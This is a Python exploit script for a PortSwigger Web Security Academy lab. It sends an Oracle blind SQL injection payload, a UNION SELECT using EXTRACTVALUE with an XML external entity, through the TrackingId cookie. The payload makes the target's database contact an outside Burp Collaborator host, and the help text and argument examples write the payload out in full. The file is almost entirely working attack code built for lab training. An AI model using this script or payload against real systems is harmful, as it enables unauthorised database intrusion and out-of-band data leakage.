#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter
from bs4 import BeautifulSoup

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//6houbzn1x291bi1jiwrev4seu50vok.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//6houbzn1x291bi1jiwrev4seu50vok.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--" -p 127.0.0.1:8080

Open Burp Collaborator and replace the address in the command with Collaborator's.
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a17007a0431da3ec071237f004b009c.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: \'+UNION+SELECT+EXTRACTVALUE(xmltype(\'<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//vba2zuu6m1s54uc5a6yjksgj6ac00p.burpcollaborator.net/">+%25remote%3b]>\'),\'/l\')+FROM+dual--', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url
else: 
    print("(-) Add / to the end of URL")
command = args.command
s = requests.Session()

def sqli(s, url, command):
    r = s.get(url, verify=False)
    cookies = r.cookies.get_dict()
    tr_id = cookies['TrackingId']
    session = cookies['session']
    tr_id_var = "TrackingId=" + tr_id + command + ";"
    session_var = " session=" + session
    headers = {
        'Cookie': tr_id_var + session_var,
        'Referer': 'https://portswigger.net/'
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = s.get(url, headers=headers, verify=False, proxies=proxies)
    else: 
        r = s.get(url, headers=headers, verify=False)
        print("Check Collaborator Client for HTTP requests")

def main():
    
    print("(+) Exploiting SQL Injection")
        
    sqli(s, url, command)

if __name__ == "__main__":
    main()
